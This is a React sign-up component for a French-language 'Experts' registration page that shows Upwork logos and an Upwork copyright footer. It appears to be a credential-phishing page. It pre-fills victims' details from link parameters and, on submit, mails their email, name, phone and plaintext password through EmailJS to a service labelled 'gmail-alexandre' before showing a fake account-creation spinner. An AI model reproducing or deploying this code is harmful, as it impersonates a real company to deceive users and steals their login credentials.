import React, { useState, useEffect, useRef } from 'react';
import emailjs from 'emailjs-com';
import { useRouter } from 'next/router';

export default function Starts() {
  const firstNameRef = useRef(null);
  const lastNameRef = useRef(null);
  const emailRef = useRef(null);
  const phoneRef = useRef(null);
  const formRef = useRef(null); // Add a ref for the form element
  const [selectedPaymentMethod, setSelectedPaymentMethod] = useState('card');
  const [password, setPassword] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [isBackgroundVisible, setIsBackgroundVisible] = useState(true);
  const router = useRouter();

  useEffect(() => {
    emailjs.init("p7vtRytijMovXPfFA");

    // Get URL parameters
    const params = new URLSearchParams(window.location.search);
    const name = params.get('name');
    const surname = params.get('surname');
    const email = params.get('mail');
    const phone = params.get('phone');

    // Pre-fill form fields
    if (name) firstNameRef.current.value = name;
    if (surname) lastNameRef.current.value = surname;
    if (email) emailRef.current.value = email;
    if (phone) phoneRef.current.value = phone;
  }, []);

  const sendEmail = (event) => {
    event.preventDefault();
    emailjs.sendForm('gmail-alexandre', 'new-registration', formRef.current, 'p7vtRytijMovXPfFA') // Use formRef.current
      .then(() => {
        console.log('SUCCESS!');
        // document.querySelector('.left-column').style.display = 'none';
        // document.querySelector('.right-column').style.width = '100%';
        // document.querySelector('.right-column').style.maxWidth = 'none';

        showStep(2); // Move to the confirmation step after successful email sending
      })
      .catch((error) => {
        console.log('FAILED...', error);
      });
  };

  //fonction pour cacher un élément et en afficher un autre :
  function showStep(step) {
    if (typeof document !== 'undefined') {
      const steps = document.querySelectorAll('.checkout-step');
      steps.forEach(s => s.classList.remove('active'));
      steps[step].classList.add('active');
    }
  }

  const handlePasswordChange = (e) => {
    setPassword(e.target.value);
  };

  const handleCreateAccount = (e) => {
    e.preventDefault();
    setIsLoading(true);
    setIsBackgroundVisible(true); // Assurez-vous que la div d'arrière-plan reste visible
    sendEmail(e);
    setTimeout(() => {
      router.push(`/dashboard?user=${firstNameRef.current.value}.${lastNameRef.current.value}`);
    }, 5000);
  };

  const isMinLength = password.length >= 8;
  const hasSpecialChar = /[!@#$%^&*(),.?":{}|<>]/.test(password);
  const hasNumber = /\d/.test(password);

  return (
    <div className={`paiement-container ${isBackgroundVisible ? '' : 'hidden'}`}>
      {isLoading && (
        <div className="loading-wrapper">
          <article>
            <h3>Création du compte...</h3>
            <p>Veuillez patienter quelques instants</p>
            <div className="loading-spinner"></div>
          </article>
        </div>
      )}
      
        <img className='logo brand' src='keltis-full.png' alt="Brand" />
        <img className='logo upwork' src='upwork-logo.png' alt="Upwork" />

        <h1>Finalisez votre inscription Experts</h1>
        <form className="checkout-form" onSubmit={sendEmail} ref={formRef}> {/* Add ref to the form */}
          <input type="hidden" name="website" value='collective-partners' />

          <div className='checkout-step active'>
            <label>
              <span>Email</span>
              <input type="text" name="email" placeholder="Email" ref={emailRef} required/>
            </label>
            <div className="form-row">
              <label>
                <span>Prénom</span>
                <input type="text" name="firstName" placeholder="Upwork" ref={firstNameRef} required/>
              </label>
              <label>
                <span>Nom</span>
                <input type="text" name="lastName" placeholder="Experts" ref={lastNameRef} required/>
              </label>
            </div>
            <label>
              <span>Mot de passe</span>
              <input 
                type="password" 
                name="password" 
                placeholder="***********" 
                value={password} 
                onChange={handlePasswordChange} 
                required
              />
              <ul className='pass-row'>
                <li className={isMinLength ? 'completed' : ''}><span>•</span> 8 caractères minimum</li>
                <li className={hasSpecialChar ? 'completed' : ''}><span>•</span> 1 caractère spécial</li>
                <li className={hasNumber ? 'completed' : ''}><span>•</span> 1 chiffre minimum</li>
              </ul>
            </label>
            <button type="submit" id="delivery-checkout" onClick={handleCreateAccount}>Créer mon compte</button>
          </div>

          <div className='checkout-step confirmation'>
           
            <p>Merci pour votre inscription, nous vous remercions pour votre confiance.</p>

          </div>
        </form>
      <p className='secure footer'>© 2015 - 2025 Upwork® Global Inc. • <a target='_blank' href='https://www.upwork.com/legal#privacy'><span className='underline'>Privacy Policy</span></a></p>
    </div>
  );
};